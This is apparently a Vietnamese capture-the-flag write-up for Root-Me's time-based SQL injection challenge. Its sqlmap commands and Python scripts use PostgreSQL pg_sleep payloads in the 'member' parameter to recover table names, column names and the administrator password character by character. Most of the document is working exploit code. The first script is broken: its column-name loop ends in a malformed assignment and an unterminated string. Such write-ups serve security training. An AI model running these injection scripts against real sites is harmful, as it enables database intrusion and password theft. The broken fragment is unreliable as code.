# SQL injection - Time based 

Point: 45

Be patient

Statement: Retrieve administrator’s password.

Related ressource: [Time-Based Blind SQL Injection using Heavy Queries](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Time%20based%20blind%20SQL%20Injection%20using%20heavy%20queries.pdf?_gl=1*31a6v3*_ga*MTE0NDg5MTA5LjE2Nzk2MzIzMDY.*_ga_SRYSKX09J7*MTY4Mjc0Nzk4OC44MS4xLjE2ODI3NDgwMjAuMC4wLjA.)

# Overview:

Time based SQL injection-là 1 kiểu tấn công blind SQL thường được dùng khi không còn cách nào khác để khai thác cơ sở dữ liệu.Kĩ thuật này gửi 1 truy vấn đến cơ sở dữ liệu, buộc cơ sở dữ liệu phải đợi 1 khoảng thời gian trước khi phản hồi. Và dựa vào thời gian phản hồi ấy hacker có thể xác định được truy vấn đưa ra là đúng hay sai. Thông thường là kiểm tra thứ tự từng kí tự của bảng hay của cột từ đó đạt được tên bảng tên cột và cả data.

Form của challenge

![image](https://user-images.githubusercontent.com/115911041/235286776-993a4abe-07ac-4f5a-b039-5538fd5e6b36.png)

Có 2 phần chính là `Login` và `Member list`. Bài này mình giải bằng 2 cách SQL map và code python.

# Solution:

## SQLmap

Khi ta chuyển sang phần `member` và chọn `admin` thì URL có thay đổi, nên ta có thể khai thác từ tham số đó

`python3 sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=3 --dbs`

![image](https://user-images.githubusercontent.com/115911041/235287468-b2ba4c20-07b0-4fff-ae10-adf0d4f50df2.png)

Kết quả cho ra database `public`.Tiếp tục truy cập vào `public`.

`python3 sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1 --time-sec=3 -D public --tables`

![image](https://user-images.githubusercontent.com/115911041/235288969-3bf14840-e3a8-4e22-a377-6564d30394e2.png)

Ra kết quả có tables `users`. Tiếp tục vào table `users`

`python3 sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=3 -D public -T users --columns`

![image](https://user-images.githubusercontent.com/115911041/235289845-443aaeab-772f-44a8-8c43-d0676bb7a7aa.png)

Bước cuối chỉ cần lấy data các column nữa là xong


## Script Python

Vì mình đã chạy sqlmap ở trên nên database này đang chạy ở verssion PostgreSQL. Nên payload được dùng là

`;select case when 1=1 then (select pg_sleep(1)) else (select pg_sleep(0)) end -- -`

Mình tham khảo các hàm [ở đây](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

Bây giờ ta sẽ tiến hành khai thác các tên bảng, tên cột được tạo bởi user bằng cách dùng thư viện requests và thư viện time của python. Với payload có dạng như sau:

```
;select case when length((select array_to_string(array(select table_name::text from information_schema.tables where table_schema in ($$public$$)),$$:$$)::text))={tableNameLen} then (select pg_sleep(5)) else (select pg_sleep(0)) end -- --
```

Source code 

```
import requests
import time

# http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1;select case when 1=1 then (select pg_sleep(2)) else (select pg_sleep(0))-- --

# Find list of table_names splited by ":" which created by user
# queryTableName = 

url = "http://challenge01.root-me.org/web-serveur/ch40/index.php"

# Find length of table_name list
tableNameLen = 0
print("Finding length of table_name list....")
while True:
    tableNameLen += 1
    queryTableLen = f"1;select case when length((select array_to_string(array(select table_name::text from information_schema.tables where table_schema in ($$public$$)),$$:$$)::text))={tableNameLen} then (select pg_sleep(1)) else (select pg_sleep(0)) end -- --"
    start = time.monotonic()
    r = requests.get(url, params={"action": "member", "member": queryTableLen})
    roundtrip = time.monotonic() - start
    if roundtrip > 1:
        break

print(f"==> table_name list has {tableNameLen} characters")
print("-------------")

# Find Tables_Names list
tableName = ""
print("Finding table_names list......")
for i in range(1, tableNameLen + 1):
    for j in range(33, 127):
        queryTableName = (
            f"1;select case when substr((select array_to_string(array(select table_name::text from information_schema.tables where table_schema in ($$public$$)),$$:$$)::text),{i},1)=CHR({j}) then (select pg_sleep(1)) else (select pg_sleep(0)) end-- -"
        )
        start = time.monotonic()
        r = requests.get(url, params={"action": "member", "member": queryTableName})
        roundtrip = time.monotonic() - start
        if roundtrip > 1:
            tableName += chr(j)
            print(f"{tableName}...")
            break

print(f"==> List of table_name is: {tableName}")
print("--------------------------------------------------")

# Find list of column_names splited by : which created by user
# Find length
columnNameLen = 0
print("Finding length of column_names list......")
while True:
    columnNameLen += 1
    queryColumnLen = f"1;select case when length((select array_to_string(array(select column_name::text from information_schema.columns where table_schema in ($$public$$)),$$:$$)::text))={columnNameLen} then (select pg_sleep(1)) else (select pg_sleep(0)) end -- --"
    start = time.monotonic()
    r = requests.get(url, params={"action": "member", "member": queryColumnLen})
    roundtrip = time.monotonic() - start
    if roundtrip > 1:
        break

print(f"==> Column_name list has {columnNameLen} characters")
print("----------")

# Find Column_names list
columnName = ""
for i in range(1, columnNameLen + 1):
    for j in range(33, 127):
        queryColumnName = ()
    f"1;select case when substr((select array_to_string(array(select column_name::text from information_schema.columns where table_schema in ($$public$$)),$$:$$)::text),{i},1)=CHR({j}) then (select pg_sleep(1)) else (select pg_sleep(0)) end-- -
       
```

Sau đó thay đổi 1 chút để tìm password

```
import requests, time

url = 'http://challenge01.root-me.org/web-serveur/ch40/index.php'

# Find length of admin password
adminPassLen = 0
print("Finding length of admin password....")
while True:
    adminPassLen += 1
    queryPassLen = f"1;select case when length((select array_to_string(array(select password::text from users where id = 1),$$:$$)::text))={adminPassLen} then (select pg_sleep(5)) else (select pg_sleep(0)) end -- --"
    start = time.time()
    r = requests.get(url, params={'action': 'member', 'member': queryPassLen})
    roundtrip = time.time() - start
    if roundtrip > 2:
        break

print('==> admin password has ' + str(adminPassLen) + ' characters')
print('-------------')

# Find admin password
adminPass = ''
print('Finding admin password......')
for i in range(1, adminPassLen + 1):
    for j in range(33, 127):
        queryadminPass = f"1;select case when substr((select array_to_string(array(select password::text from users where id = 1),$$:$$)::text),{i},1)=CHR({j}) then (select pg_sleep(5)) else (select pg_sleep(0)) end-- -"
        start = time.time()
        r = requests.get(url, params={'action': 'member', 'member': queryadminPass})
        roundtrip = time.time() - start
        print(j)
        print(roundtrip)
        if roundtrip > 2:
            adminPass += chr(j)
            print(adminPass + '...')
            break

print('==> admin password is: ' + adminPass)
print('-----------------------------------------------')

# Find list of table names created by user
tableNames = []
print('Finding list of table names...')
for i in range(1, 20):
    queryTableNames = f"1;select case when EXISTS(SELECT table_name FROM information_schema.tables WHERE table_name::text like $$user_table_{i}$$) then (select pg_sleep(5)) else (select pg_sleep(0)) end-- -"
    start = time.time()
    r = requests.get(url, params={'action': 'member', 'member': queryTableNames})
    roundtrip = time.time() - start
    if roundtrip > 2:
        tableNames.append(f'user_table_{i}')
        print(f'Found table: user_table_{i}')
    else:
        break

print(f'List of table names created by user: {tableNames}')
```

